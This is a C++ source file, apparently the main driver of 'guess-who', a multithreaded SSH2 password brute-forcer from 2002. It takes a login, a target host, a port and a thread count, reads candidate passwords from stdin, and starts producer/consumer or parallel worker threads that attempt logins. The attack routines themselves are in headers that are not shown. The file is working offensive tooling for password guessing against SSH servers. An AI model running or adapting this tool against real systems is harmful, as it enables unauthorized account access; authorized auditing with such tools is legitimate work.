/*
 * Copyright (C) 2002,2003 Sebastian Krahmer.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Sebastian Krahmer.
 * 4. The name Sebastian Krahmer may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include <stdio.h>
#include <unistd.h>
#include <iostream>
#include <pthread.h>
#include <map>
#include <vector>

extern "C" {
#include <openssl/crypto.h>
}
#include "thread.h"
#include "misc.h"
#include "ssh.h"

using namespace std;

pthread_mutex_t map_lock = PTHREAD_MUTEX_INITIALIZER;
map<int, pthread_mutex_t *> n_locks;


unsigned long my_id()
{
	return (unsigned long)pthread_self();
}


void my_locking(int mode, int n, const char *file, int line)
{
	pthread_mutex_t *l = NULL;

	if (mode & CRYPTO_LOCK) {
		pthread_mutex_lock(&map_lock);
		if (n_locks.find(n) == n_locks.end()) {
			l = new pthread_mutex_t;
			pthread_mutex_init(l, NULL);
			n_locks[n] = l;
		} else
			l = n_locks[n];
		pthread_mutex_lock(l);
		pthread_mutex_unlock(&map_lock);
	} else {
		pthread_mutex_lock(&map_lock);
		pthread_mutex_unlock(n_locks[n]);
		pthread_mutex_unlock(&map_lock);
	}
}


void usage()
{
	printf("\nguess-who SSH2 parallel passwd bruter (C) 2002 by "
	       "krahmer@cs.uni-potsdam.de\n\n"
	       "Usage: ./a.out <-l login> <-h host> [-p port] <-1|-2> "
	       "[-N nthreads] [-n ntries]\n"
	       "Use -1 for producer/consumer thread model, -2 for dumb "
	       "parallelism. Passwds go on stdin. :)\n\n");
	exit(1);
}


int main(int argc, char **argv)
{

	int c;
	int mode = 0, nthreads = 10;
	thread_data td;

	td.port = 22;
	td.tries = 6;

	while ((c = getopt(argc, argv, "l:h:p:12N:n:")) != -1) {
		switch (c) {
		case 'n':
			td.tries = atoi(optarg);
			break;
		case 'l':
			td.login = optarg;
			break;
		case 'h':
			td.host = optarg;
			break;
		case 'p':
			td.port = atoi(optarg);
			break;
		case '1':
			mode = 1;
			break;
		case '2':
			mode = 2;
			break;
		case 'N':
			nthreads = atoi(optarg);
			break;
		default:
			usage();
		}
	}

	if (td.login.size() == 0 || td.host.size() == 0 || mode == 0 ||
	    (mode == 2 && nthreads == 0))
		usage();

	CRYPTO_set_locking_callback(my_locking);
	CRYPTO_set_id_callback(my_id);

	now = time(NULL);

	if (mode == 1) {
		pthread_t tid1, tid2;

		pthread_create(&tid1, NULL, producer_thread, &td);
		pthread_create(&tid2, NULL, consumer_thread, &td);	

		void *vp;
		pthread_join(tid1, &vp);
		pthread_join(tid2, &vp);
	} else {
		vector<pthread_t *> tids;
		tids.resize(nthreads);

		for (int i = 0; i < nthreads; ++i) {
			pthread_t *tid = new pthread_t;
			pthread_create(tid, NULL, single_try, &td);
			tids[i] = tid;
		}
		void *vp;
		for (int i = 0; i < nthreads; ++i) {
			pthread_join(*tids[i], &vp);
			delete tids[i];
		}
	}

	return 0;
}

